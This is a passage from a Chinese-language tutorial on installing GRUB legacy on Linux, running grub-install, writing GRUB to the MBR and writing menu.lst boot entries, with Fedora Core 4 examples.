title="3、GRUB的Linux版本软件包的安装；"></a>3、GRUB的Linux版本软件包的安装；</h2><p>其实对于Linux的GRUB，几乎所有的Linux主流发行版都有打包，如果您安装了Linux，并且在开机后出现GRUB字样的，证明您已经安装了GRUB；而无需再次安装；Linux的GRUB软件包安装部份并不是本文的重点；</p><p>如果您的Linux系统没有安装GRUB，或者采用的是LILO，而您想用GRUB，可以用系统安装盘自带GRUB软件包来安装，或者到相关发行版本的软件仓库下载后安装；</p><p>GRUB 的Linux版本目前在各大发行版中都有打包；比如Fedora&#x2F;Redhat&#x2F;Centos&#x2F;Mandrive&#x2F;Mandriva&#x2F;SuSE等以RPM包管理机制的系统，可以通过如下的命令来安装；</p><p>请参考《Fedora &#x2F; Redhat 软件包管理指南》</p><pre><code>[root@localhost ~]# rpm -ivh grub*.rpm</code></pre><p>如果是Slackware 您可以用如下的办法来安装；</p><pre><code>[root@localhost ~]# installpkg grub*.tgz</code></pre><p>其它的发行版本请用其自己特色的软件包管理工具来安装；</p><p>当然您也可以通过源码包，在任何Linux的发行版上安装；至于源码包的安装方法；</p><p>请参考：《如何编译安装源码包软件》</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta">#tar zxvf grub*.tar.gz</span><br>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta">#cd grub-xxx</span><br>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta">#./configure<span class="hljs-comment">;make;make install</span></span><br></code></pre></td></tr></table></figure><p>确认您是否成功安装了GRUB，您可以测试是否有如下两个命令；</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># grub</span><br>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># grub-install</span><br></code></pre></td></tr></table></figure><p>如果您不能找到这两个命令，可能您的可执行程序的路径没有设置；</p><p>请参考：《设置可执行程序路径》，当然您可以用绝对路径；比如下面的；</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># /usr/sbin/grub</span><br>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># /usr/sbin/grub-install</span><br></code></pre></td></tr></table></figure><p>如果您还是找不到GRUB软件包安装在哪了；您可以用下面的命令来解决和查找；</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># updatedb  注：这个要花很长时间；是索引slocate 的库，然后再通过locate来查找；</span><br>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># locate grub</span><br></code></pre></td></tr></table></figure><p>比如找到的是有类似如下的；</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@localhost</span> ~]<span class="hljs-comment"># locate grub</span><br><span class="hljs-regexp">/sbin/grub</span>-md5-crypt<br><span class="hljs-regexp">/sbin/grub</span><br><span class="hljs-regexp">/sbin/grub</span>-install<br><span class="hljs-regexp">/sbin/grub</span>-terminfo<br></code></pre></td></tr></table></figure><p>在一般情况下，在路径中带有bin或sbin中字样的，这些路径下都是可执行程序；sbin 是超级权限用户才能使用的管理命令；要使用这些命令一般的情况下得切换到root用户下才能使用；比如</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[beinan<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>su -  注：切换到root用户，并且切换到其家目录；<br><span class="hljs-symbol">Password:</span><br>[root<span class="hljs-variable">@localhost</span> ~]<span class="hljs-comment">#/sbin/grub  注：用绝对路径来运行grub命令；</span><br></code></pre></td></tr></table></figure><h1 id="三、在Linux中，GRUB的配置中的安装和写入硬盘的MBR；"><a href="#三、在Linux中，GRUB的配置中的安装和写入硬盘的MBR；" class="headerlink" title="三、在Linux中，GRUB的配置中的安装和写入硬盘的MBR；"></a>三、在Linux中，GRUB的配置中的安装和写入硬盘的MBR；</h1><h2 id="1、在Linux中，GRUB配置过程中的安装grub-install；"><a href="#1、在Linux中，GRUB配置过程中的安装grub-install；" class="headerlink" title="1、在Linux中，GRUB配置过程中的安装grub-install；"></a>1、在Linux中，GRUB配置过程中的安装grub-install；</h2><p>grub-install 命令有何用呢？其实就是把我们前面已经安装的软件包中的一些文件复制到 &#x2F;boot&#x2F;grub中；对于新安装GRUB软件包后，也是一个必经的过程；我们前面所说的GRUB软件包的安装；而现在我们说的是GRUB配置的过程中的安装；虽然在洋文中都是install ，但表达的意思是不一样的；</p><p>我们首先要运行 fdisk -l 来确认到底是硬盘的标识；</p><p>这个过程主要是确认硬盘的标识是哪个调备，到底是&#x2F;dev&#x2F;hda还是&#x2F;dev&#x2F;hdb 还是其它的；</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@localhost ~]<span class="hljs-comment"># fdisk -l</span><br>Disk /dev/hda: 80.0 GB,<span class="hljs-number"> 80026361856 </span>bytes<br>255 heads,<span class="hljs-number"> 63 </span>sectors/track,<span class="hljs-number"> 9729 </span>cylinders<br>Units = cylinders of<span class="hljs-number"> 16065 </span>*<span class="hljs-number"> 512 </span>=<span class="hljs-number"> 8225280 </span>bytes<br><br>   Device Boot      Start         End      Blocks   Id  System<br>/dev/hda1   *          <span class="hljs-number"> 1 </span>       <span class="hljs-number"> 970 </span>    7791493+  <span class="hljs-number"> 7 </span> HPFS/NTFS<br>/dev/hda2            <span class="hljs-number"> 971 </span>      <span class="hljs-number"> 9729 </span>   70356667+  <span class="hljs-number"> 5 </span> Extended<br>/dev/hda5            <span class="hljs-number"> 971 </span>      <span class="hljs-number"> 2915 </span>  <span class="hljs-number"> 15623181 </span>   b  W95 FAT32<br>/dev/hda6           <span class="hljs-number"> 2916 </span>      <span class="hljs-number"> 4131 </span>    9767488+ <span class="hljs-number"> 83 </span> Linux<br>/dev/hda7           <span class="hljs-number"> 4132 </span>      <span class="hljs-number"> 5590 </span>  <span class="hljs-number"> 11719386 </span> <span class="hljs-number"> 83 </span> Linux<br>/dev/hda8           <span class="hljs-number"> 5591 </span>      <span class="hljs-number"> 6806 </span>    9767488+ <span class="hljs-number"> 83 </span> Linux<br>/dev/hda9           <span class="hljs-number"> 6807 </span>      <span class="hljs-number"> 9657 </span>  <span class="hljs-number"> 22900626 </span> <span class="hljs-number"> 83 </span> Linux<br>/dev/hda10          <span class="hljs-number"> 9658 </span>      <span class="hljs-number"> 9729 </span>     578308+ <span class="hljs-number"> 82 </span> Linux swap / Solaris<br></code></pre></td></tr></table></figure><p>如果通过fdisk -l 出现有&#x2F;dev&#x2F;hda字样的，我们就要用下面的命令来安装；</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript">[root@localhost ~]<span class="hljs-comment"># grub-install /dev/hda</span><br>Installation finished. No <span class="hljs-keyword">error</span> reported.<br>This <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">contents</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> device map /boot/grub/device.map.<br>Check <span class="hljs-keyword">if</span> this <span class="hljs-keyword">is</span> correct <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span>. If any <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> lines <span class="hljs-keyword">is</span> incorrect,<br>fix <span class="hljs-keyword">it</span> <span class="hljs-keyword">and</span> re-<span class="hljs-built_in">run</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">script</span> `grub-install&#x27;.<br><br>(fd0)   /dev/fd0<br>(hd0)   /dev/hda<br></code></pre></td></tr></table></figure><p>如果是您fdisk -l 出现的有&#x2F;dev&#x2F;hdb呢，那就如下运行；</p><pre><code>[root@localhost ~]# grub-install /dev/hdb</code></pre><p>如果既有&#x2F;dev&#x2F;hda和&#x2F;dev&#x2F;hdb 就安装到&#x2F;dev&#x2F;hda中；</p><pre><code>[root@localhost ~]# grub-install /dev/hda</code></pre><p>值得注意的是如果您有一个&#x2F;boot分区，应该用如下的办法来安装；</p><pre><code>[root@localhost ~]#grub-install --root-directory=/boot /dev/hda[root@localhost ~]#grub-install --root-directory=/boot /dev/hdb</code></pre><p>注解：具体是&#x2F;dev&#x2F;hda还是&#x2F;dev&#x2F;hdb，请以fdisk -l 为准；如果两个都有，就看您把&#x2F;boot分区是放在第一块硬盘还是第二块硬盘上了，以实际情况为准；</p><h2 id="2、设定GRUB的-x2F-boot分区并写入MBR；；"><a href="#2、设定GRUB的-x2F-boot分区并写入MBR；；" class="headerlink" title="2、设定GRUB的&#x2F;boot分区并写入MBR；；"></a>2、设定GRUB的&#x2F;boot分区并写入MBR；；</h2><p>在Linux中，GRUB软件包的安装，及在配置过程中安装grub到 &#x2F;boot中还是不够的， 还要把GRUB，写入MBR才行；有时我们重新安装了Windows，Windows会把MBR 重写，这样GRUB就消失了；如果您出现这样的情况，就要进行这个过程；</p><pre><code>[root@localhost ~]# grub</code></pre><p>会出现grub&gt;提示符，这是grub命令行模式 ，如果能在开机中出现提示符，没有引导不起来的系统，除非您的系统破坏的极为严重。如果仅仅是GRUB被破坏了，GRUB命令行是能让操作系统引导起来的；</p><p>接着看例子，我们要找到 &#x2F;boot&#x2F;grub&#x2F;stage1的，在grub&gt;后面输入；</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">grub&gt; <span class="hljs-keyword">find</span>  <span class="hljs-regexp">/boot/g</span>rub/stage1<br>(hd0,<span class="hljs-number">6</span>) <br>(fd0)   注：这个是软驱；现在很少用软驱了，如果您有这方面的需要，自己看GRUB的DOC吧；<br></code></pre></td></tr></table></figure><p>注解：</p><p>(hd0,6) 这是&#x2F;boot所在的分区；不要误解为是Linux 的&#x2F;所在的分区，这是值得注意的；<br>(fd0) 注：这个是软驱；现在很少用软驱了，如果您有这方面的需要，自己看GRUB的DOC吧；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">grub&gt;</span><span class="language-bash">root (hd0,6)    注：这是/boot所在的分区；</span><br><span class="hljs-meta prompt_">grub&gt;</span><span class="language-bash">setup (hd0)   注：把GRUB写到MBR上；</span><br></code></pre></td></tr></table></figure><p>注解：</p><p>上面这步骤是根据 find &#x2F;boot&#x2F;stage1而来的，仔细看一下就明白了；现在我们一般安装很少会把&#x2F;boot分区列为一个单独的分区；不过有的弟兄可能也喜欢这么做；所以还是有必要说一下为好；</p><h1 id="四、GRUB的配置文件的menu-lst的写法；"><a href="#四、GRUB的配置文件的menu-lst的写法；" class="headerlink" title="四、GRUB的配置文件的menu.lst的写法；"></a>四、GRUB的配置文件的menu.lst的写法；</h1><p>对于GRUB来说，如果没有配置menu.lst，无论是Linux版本的GRUB，还是WINGRUB，都会有命令行可用，通过命令行是一样能把操作系统引导起来的；有些弟兄总以为menu.lst 配置错了， 或者在机器启动后出现grub&gt;命令行模式就要重新安装系统，其实根本没有这个必要；只要学会GRUB的命令行的用法，根本没有必要重装系统；</p><p>menu.lst 位于&#x2F;boot&#x2F;grub目录中，也就是&#x2F;boot&#x2F;grub&#x2F;menu.lst 文件；您可以用vi或您喜欢的编辑器来编辑他；如果您不会用vi，还是去学习一下吧；简单的用法怎么也得会，对不对？毕竟这个文档不是讲vi的用法的；</p><p>有的弟兄会说，我没有menu.lst怎么办？那就创建一个；用下面的命令；</p><pre><code>[root@localhost ~]# touch  /boot/grub/menu.lst</code></pre><p>然后我们再做一个&#x2F;boot&#x2F;grub&#x2F;menu.lst 的链接 &#x2F;boot&#x2F;grub&#x2F;grub.conf</p><pre><code>[root@localhost ~]# cd /boot/grub[root@localhost ~]# ln -s menu.lst grub.conf</code></pre><p>现在我们来写GRUB的menu.lst了，因为&#x2F;boot&#x2F;grub&#x2F;grub.conf是 &#x2F;boot&#x2F;grub&#x2F;menu.lst的链接文件，改哪个都行。链接文件相当于Windows的快捷方式，这样可能能更好的理解；</p><h2 id="1、menu-lst的写法之一；"><a href="#1、menu-lst的写法之一；" class="headerlink" title="1、menu.lst的写法之一；"></a>1、menu.lst的写法之一；</h2><p>首先我们看一下我的Fedora 4.0 中的&#x2F;boot&#x2F;grub&#x2F;menu.lst 的内容；</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">default</span>=<span class="hljs-number">0</span><br><span class="hljs-attribute">timeout</span>=<span class="hljs-number">5</span><br><span class="hljs-comment">#splashimage=(hd0,6)/boot/grub/splash.xpm.gz</span><br><span class="hljs-attribute">hiddenmenu</span><br><span class="hljs-attribute">title</span> Fedora Core (<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4)<br>        <span class="hljs-attribute">root</span> (hd0,<span class="hljs-number">6</span>)<br>        <span class="hljs-attribute">kernel</span> /boot/vmlinuz-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4 ro root=LABEL=/<br>        <span class="hljs-attribute">initrd</span> /boot/initrd-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4.img<br><span class="hljs-attribute">title</span> WinXp<br>        <span class="hljs-attribute">rootnoverify</span> (hd0,<span class="hljs-number">0</span>)<br>        <span class="hljs-attribute">chainloader</span> +<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>注解：<br>default&#x3D;0</p><p>default&#x3D;0 是默认启动哪个系统，从0开始；每个操作系统的启动的定义都从title开始的，第一个title 在GRUB的启动菜单上显示为0,第二个启动为1，以此类推；<br>timeout&#x3D;5</p><p>注：表示在开机后，GRUB画面出现几秒后开始以默认启动；如果在启动时，移动上下键，则解除这一规则；<br>    #splashimage&#x3D;(hd0,6)&#x2F;boot&#x2F;grub&#x2F;splash.xpm.gz 注：GRUB的背景画面，这个是可选项；我不喜欢GRUB的背景画面，所以加#号注掉，也可以删除；<br>hiddenmenu</p><p>注解：隐藏GRUB的启动菜单，这项也是可选的，也可以用#号注掉；</p><p>一般的情况下对Linux操作系统的启动，一般要包括四行；title 行；root行；kernel 行；initrd 行；</p><h3 id="1）在menu-lst中-，通过-root-hd-0-n-y-来指定-x2F-boot-所在的分区；"><a href="#1）在menu-lst中-，通过-root-hd-0-n-y-来指定-x2F-boot-所在的分区；" class="headerlink" title="1）在menu.lst中 ，通过 root (hd[0-n],y)来指定&#x2F;boot 所在的分区；"></a>1）在menu.lst中 ，通过 root (hd[0-n],y)来指定&#x2F;boot 所在的分区；</h3><p>title XXXXX 注：title 后面加一个空格，title 是小写的，后面可以自己定义；比如FC4，自己定义一个名字就行；<br>root (hd[0-n],y) ，在本例中，我们看到的是root (hd0,6) ,root (hd[0-n],y)表示的是&#x2F;boot所在的分区；有时我们安装Linux的时候，大多是不设置&#x2F;boot的，这时&#x2F;boot和&#x2F;所在的同一个分区； 这个root (hd[0-n],y)很重要，因为&#x2F;boot目录中虽然有grub目录，最为重要的是还有kernel 和initrd文件，这是Linux能启动起来最为重要东西；</p><p>有的弟兄会问，root (hd[0-n],y)是怎么来的？</p><p>请参考：《在Linux系统中存储设备的两种表示方法》</p><h3 id="2）在menu-lst中，kernel-命令行的写法；"><a href="#2）在menu-lst中，kernel-命令行的写法；" class="headerlink" title="2）在menu.lst中，kernel 命令行的写法；"></a>2）在menu.lst中，kernel 命令行的写法；</h3><p>kernel 一行，是通指定内核及Linux的&#x2F;分区所在位置；</p><p>比如例子中是；</p><pre><code>kernel /boot/vmlinuz-2.6.11-1.1369_FC4 ro root=LABEL=/</code></pre><p>在这里以kernel 起始，指定Linux的内核的文件所处的绝对路径；因为内核是处在&#x2F;boot目录中的， 如果&#x2F;boot是独立的一个分区，则需要把boot省略；如果&#x2F;boot是独立的分区，这行要写成:</p><pre><code>kernel /vmlinuz-2.6.11-1.1369_FC4 ro root=LABEL=/ </code></pre><p>因为&#x2F;boot所处的分区已经在title 下一行root (hd[0-n],y)中指定了，所以就无需要再指明内核处在哪个分区了；另外Linux系统的硬盘分区的挂载配置文件在&#x2F;etc&#x2F;fstab ，原理是通过 mount &#x2F;dev&#x2F;hd[a-z]X &#x2F;boot 来进行的；您可以对照着来理解；</p><p>ro 表示只读； root&#x3D;LABEL&#x3D;&#x2F; 来表示Linux的根所处的分区。LABEL&#x3D;&#x2F; 这是硬盘分区格式化为相应文件系统后所加的标签；如果您不了解什么是标签，也可以直接以&#x2F;dev&#x2F;hd[a-z]X 或者&#x2F;dev&#x2F;sd[a-z]X来表示；就看您的Linux是根分区是在哪个分区了。比如我的是在&#x2F;dev&#x2F;hda7 ， 那这里就可以写成root&#x3D;&#x2F;dev&#x2F;hda7；</p><p>如果查看系统运行所挂载的分区，请用 df -lh 来查看，就能明白是不是&#x2F;boot是独立的分区，或者查看&#x2F;etc&#x2F;fstab也能知道；</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@localhost</span> ~]<span class="hljs-comment"># df -lh</span><br>Filesystem            容量  已用 可用 已用% 挂载点<br><span class="hljs-regexp">/dev/hda</span>7              <span class="hljs-number">11</span>G  <span class="hljs-number">9.2</span>G  <span class="hljs-number">1.2</span>G  <span class="hljs-number">90</span>% <span class="hljs-regexp">/</span><br><span class="hljs-regexp">/dev</span><span class="hljs-regexp">/shm              236M     0  236M   0% /dev</span><span class="hljs-regexp">/shm</span><br></code></pre></td></tr></table></figure><p>在这个例子中，我们可以发现 &#x2F;boot并没有出现只有&#x2F;dev&#x2F;hda7，这表示&#x2F;boot并不是独立的一个分区；所有的东西都包含在&#x2F;中；于是我们在&#x2F;boot中查看内核版本；</p><pre><code>[root@localhost ~]# ls /boot/vmlinuz*/boot/vmlinuz-2.6.11-1.1369_FC4   注：看到内核vmlinuz所处的目录；</code></pre><p>于是我们就可以这样kernel 这行了；</p><pre><code>kernel /boot/vmlinuz-2.6.11-1.1369_FC4  ro root=/dev/hda7</code></pre><h3 id="3）initrd-命令行的写法；"><a href="#3）initrd-命令行的写法；" class="headerlink" title="3）initrd 命令行的写法；"></a>3）initrd 命令行的写法；</h3><p>如果是&#x2F;boot独立一个分区，initrd 一行要把&#x2F;boot中省略；如果&#x2F;boot不是处于一个分区，而是和Linux的&#x2F;分区处于同一分区，不应该省略；</p><p>比如我们在2）中用的例子；现在拿到这里，我们应该首先查看 &#x2F;boot中的initrd的文件名到底是什么；</p><pre><code>[root@localhost ~]# ls /boot/initrd*/boot/initrd-2.6.11-1.1369_FC4.img</code></pre><p>如果是通过df -lh 得知或查看&#x2F;etc&#x2F;fstab 也行， 得知&#x2F;boot是独立的分区；这时initrd 应该写成；</p><pre><code>initrd  /initrd-2.6.11-1.1369_FC4.img</code></pre><p>如果是 &#x2F;boot不是独处一个分区，而是在&#x2F;同一处一个分区， 则要写成；</p><pre><code>initrd  /boot/initrd-2.6.11-1.1369_FC4.img</code></pre><h3 id="4）menu-lst第一种写法的总结和实践；"><a href="#4）menu-lst第一种写法的总结和实践；" class="headerlink" title="4）menu.lst第一种写法的总结和实践；"></a>4）menu.lst第一种写法的总结和实践；</h3><p>在这里，我们只说重要的，不重要的就一带而过了；</p><h4 id="1］用fdisk-l-；df-lh-；more-x2F-etc-x2F-fstab来确认分区情况；"><a href="#1］用fdisk-l-；df-lh-；more-x2F-etc-x2F-fstab来确认分区情况；" class="headerlink" title="1］用fdisk -l ；df -lh ；more &#x2F;etc&#x2F;fstab来确认分区情况；"></a>1］用fdisk -l ；df -lh ；more &#x2F;etc&#x2F;fstab来确认分区情况；</h4><p>我们过fdisk -l ；df -lh ; more &#x2F;etc&#x2F;fstab 来确认&#x2F;boot所在的分区，及Linux的根分区所在位置；</p><p>比如我们确认&#x2F;boot和Linux的&#x2F;分区同处一个分区；</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@localhost</span> ~]<span class="hljs-comment"># df -lh</span><br>Filesystem            容量  已用 可用 已用% 挂载点<br><span class="hljs-regexp">/dev/hda</span>7              <span class="hljs-number">11</span>G  <span class="hljs-number">9.2</span>G  <span class="hljs-number">1.2</span>G  <span class="hljs-number">90</span>% <span class="hljs-regexp">/</span><br><span class="hljs-regexp">/dev</span><span class="hljs-regexp">/shm              236M     0  236M   0% /dev</span><span class="hljs-regexp">/shm</span><br></code></pre></td></tr></table></figure><p>然后我们&#x2F;etc&#x2F;fstab 中,查看&#x2F;分所在的分区或分区标签是什么；</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@localhost ~]<span class="hljs-comment"># more /etc/fstab</span><br><span class="hljs-comment"># This file is edited by fstab-sync - see &#x27;man fstab-sync&#x27; for details</span><br>L<span class="hljs-attr">ABEL</span><span class="hljs-operator">=</span><span class="hljs-symbol">/</span>                 <span class="hljs-symbol">/</span>                       ext3    defaults        <span class="hljs-number">1</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">/dev/devpts</span>             <span class="hljs-symbol">/dev/pts</span>                devpts  gid<span class="hljs-operator">=</span><span class="hljs-number">5</span>,mode<span class="hljs-operator">=</span><span class="hljs-number">620</span>  <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">/dev/shm</span>                <span class="hljs-symbol">/dev/shm</span>                tmpfs   defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">/dev/proc</span>               <span class="hljs-symbol">/proc</span>                   proc    defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">/dev/sys</span>                <span class="hljs-symbol">/sys</span>                    sysfs   defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span><br>L<span class="hljs-attr">ABEL</span><span class="hljs-operator">=</span>SWAP-hda1         swap                    swap    defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">/dev/hdc</span>                <span class="hljs-symbol">/media/cdrecorder</span>       auto    pamconsole,exec,noauto,managed <span class="hljs-number">0</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>经过上面的df -lh 和more &#x2F;etc&#x2F;fstab 的对照中得知，&#x2F;boot并是独处一个分区，而是和&#x2F;在同一个分区；这个Linux系统安装在&#x2F;dev&#x2F;hda7上，文件系统（此分区）的标签为 LABEL&#x3D;&#x2F; ，&#x2F;boot也是处于&#x2F;dev&#x2F;hda7 ，&#x2F;dev&#x2F;hda7也可以说是 root (hd0,6)；</p><h4 id="2-查看内核vmlinuz的和initrd文件名的全称；"><a href="#2-查看内核vmlinuz的和initrd文件名的全称；" class="headerlink" title="2]查看内核vmlinuz的和initrd文件名的全称；"></a>2]查看内核vmlinuz的和initrd文件名的全称；</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]# <span class="hljs-built_in">ls</span> -lh /boot/vmlinuz*<br>-rw-r--r--  1 root root 1.6M 2005-06-03  /boot/vmlinuz-2.6.11-1.1369_FC4<br>[root@localhost ~]# <span class="hljs-built_in">ls</span> -lh /boot/initrd*<br>-rw-r--r--  1 root root 1.1M 11月 26 22:30 /boot/initrd-2.6.11-1.1369_FC4.img<br></code></pre></td></tr></table></figure><p>3]开始写menu.lst ；</p><p>我们根据上面所提到的，可以写成如下的样子；</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">default</span>=<span class="hljs-number">0</span> <br><span class="hljs-attribute">timeout</span>=<span class="hljs-number">5</span><br><span class="hljs-attribute">title</span> FC4<br>        <span class="hljs-attribute">root</span> (hd0,<span class="hljs-number">6</span>)<br>        <span class="hljs-attribute">kernel</span> /boot/vmlinuz-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4 ro root=LABEL=/<br>        <span class="hljs-attribute">initrd</span> /boot/initrd-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4.img<br></code></pre></td></tr></table></figure><p>也可以写成；</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">default</span>=<span class="hljs-number">0</span> <br><span class="hljs-attribute">timeout</span>=<span class="hljs-number">5</span><br><span class="hljs-attribute">title</span> FC4<br>        <span class="hljs-attribute">root</span> (hd0,<span class="hljs-number">6</span>)<br>        <span class="hljs-attribute">kernel</span> /boot/vmlinuz-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4 ro root=/dev/hda7<br>        <span class="hljs-attribute">initrd</span> /boot/initrd-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4.img<br></code></pre></td></tr></table></figure><p>注解：上面两个不同之处在于一指定Linux的根&#x2F;所在的分区时，一个是用了文件系统的标签，另一个没有用标签；</p><h2 id="2、menu-lst的写法之二，精简型；"><a href="#2、menu-lst的写法之二，精简型；" class="headerlink" title="2、menu.lst的写法之二，精简型；"></a>2、menu.lst的写法之二，精简型；</h2><p>本写法主要是把指定&#x2F;boot所位于的所分区直接写入kernel 指令行；这样就省略了通过root (hd[0-n],y)来指定&#x2F;boot所位于的分区；</p><h3 id="1-第一种情况：-x2F-boot和Linux的-x2F-根分区在同一个分区；"><a href="#1-第一种情况：-x2F-boot和Linux的-x2F-根分区在同一个分区；" class="headerlink" title="1)第一种情况：&#x2F;boot和Linux的&#x2F;根分区在同一个分区；"></a>1)第一种情况：&#x2F;boot和Linux的&#x2F;根分区在同一个分区；</h3><p>有前面的那么多的讲解，menu.lst写法之二就好理解多了；也得分两种情况，咱们先把&#x2F;boot并不是独处一个分区，而是和Linux的根分区处于同一个分区；我们以 4）menu.lst第一种方法的写法总结 的实例为例子；</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">default</span>=<span class="hljs-number">0</span> <br><span class="hljs-attribute">timeout</span>=<span class="hljs-number">5</span><br><span class="hljs-attribute">title</span> FC4x<br>        <span class="hljs-attribute">kernel</span> (hd0,<span class="hljs-number">6</span>)/boot/vmlinuz-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4 ro root=/dev/hda7<br>        <span class="hljs-attribute">initrd</span> (hd0,<span class="hljs-number">6</span>)/boot/initrd-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4.img<br></code></pre></td></tr></table></figure><p>注解：</p><p>title FC4x 注：自己为这个Linux 